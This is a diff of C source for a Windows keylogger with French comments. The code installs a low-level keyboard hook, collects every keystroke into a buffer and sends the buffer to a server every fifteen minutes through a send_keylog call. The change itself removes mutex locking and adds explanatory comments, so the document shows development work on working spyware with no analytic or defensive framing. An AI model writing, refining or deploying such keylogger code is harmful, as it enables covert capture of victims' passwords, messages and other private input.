@@ -8,16 +8,16 @@
 #define KEYLOG_BUFFER_SIZE (LARGE_BUFFER * 4)
 #define SEND_INTERVAL_MS   (15 * 60 * 1000)   /* 15 minutes */
 
-static HHOOK   g_hook      = NULL;
-static HANDLE  g_mutex     = NULL;
-static HANDLE  g_thread    = NULL;
-static volatile int g_running = 0;
-static int     g_machine_id   = 0;
+static HHOOK          g_hook       = NULL;
+static HANDLE         g_thread     = NULL;
+static volatile int   g_running    = 0;
+static int            g_machine_id = 0;
 
 static char   g_buffer[KEYLOG_BUFFER_SIZE];
 static size_t g_buf_len = 0;
 
-/* Callback appelé à chaque frappe clavier */
+/* Callback appelé à chaque frappe clavier.
+   S'exécute dans le même thread que KeylogThread → pas besoin de mutex. */
 static LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
     if (nCode >= 0 && wParam == WM_KEYDOWN) {
         KBDLLHOOKSTRUCT *kb = (KBDLLHOOKSTRUCT *)lParam;
@@ -44,14 +44,12 @@ static LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
         }
 
         if (key[0]) {
-            WaitForSingleObject(g_mutex, INFINITE);
             size_t klen = strlen(key);
             if (g_buf_len + klen < KEYLOG_BUFFER_SIZE - 1) {
                 memcpy(g_buffer + g_buf_len, key, klen);
                 g_buf_len += klen;
                 g_buffer[g_buf_len] = '\0';
             }
-            ReleaseMutex(g_mutex);
         }
     }
     return CallNextHookEx(g_hook, nCode, wParam, lParam);
@@ -59,16 +57,14 @@ static LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
 
 /* Envoie le contenu du buffer au serveur et le vide */
 static void flush_buffer(void) {
-    WaitForSingleObject(g_mutex, INFINITE);
     if (g_buf_len > 0) {
         send_keylog(g_machine_id, g_buffer);
         g_buf_len    = 0;
         g_buffer[0]  = '\0';
     }
-    ReleaseMutex(g_mutex);
 }
 
-/* Thread principal du keylogger */
+/* Thread du keylogger : installe le hook et tourne jusqu'à g_running = 0 */
 static DWORD WINAPI KeylogThread(LPVOID param) {
     (void)param;
     g_hook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
@@ -102,7 +98,6 @@ void start_keylogger(int machine_id) {
     g_machine_id = machine_id;
     g_buf_len    = 0;
     g_buffer[0]  = '\0';
-    g_mutex      = CreateMutex(NULL, FALSE, NULL);
     g_running    = 1;
     g_thread     = CreateThread(NULL, 0, KeylogThread, NULL, 0, NULL);
 }
@@ -111,13 +106,9 @@ void stop_keylogger(void) {
     if (!g_running) return;
     g_running = 0;
     if (g_thread) {
-        WaitForSingleObject(g_thread, 5000);
+        WaitForSingleObject(g_thread, 5000); /* attend que le thread finisse */
         CloseHandle(g_thread);
         g_thread = NULL;
     }
     flush_buffer(); /* envoie ce qui reste dans le buffer */
-    if (g_mutex) {
-        CloseHandle(g_mutex);
-        g_mutex = NULL;
-    }
 }
